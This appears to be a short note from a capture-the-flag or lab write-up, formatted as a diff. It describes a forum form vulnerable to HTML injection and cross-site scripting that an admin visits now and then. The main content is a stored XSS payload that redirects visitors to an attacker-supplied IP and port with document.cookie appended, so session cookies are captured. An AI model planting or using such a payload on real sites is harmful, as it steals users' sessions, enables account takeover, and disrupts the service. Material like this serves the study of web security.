@@ -1,0 +1,9 @@
+Found that the form is vulnerable to both html and xss.
+
+Admin will be coming in from time to time.
+
+Add a script that posts the document.cookie value to the form.
+
+<script>window.location = ‘http://<your ip>:4242/page?param=’ + document.cookie </script>
+
+Again, this is not stealthy. It will redirect any logins so that the session cookie can be captured, causing the entire forum to be out-of-service. It should be fairly obvious what is happening to the system admin when they first log in.
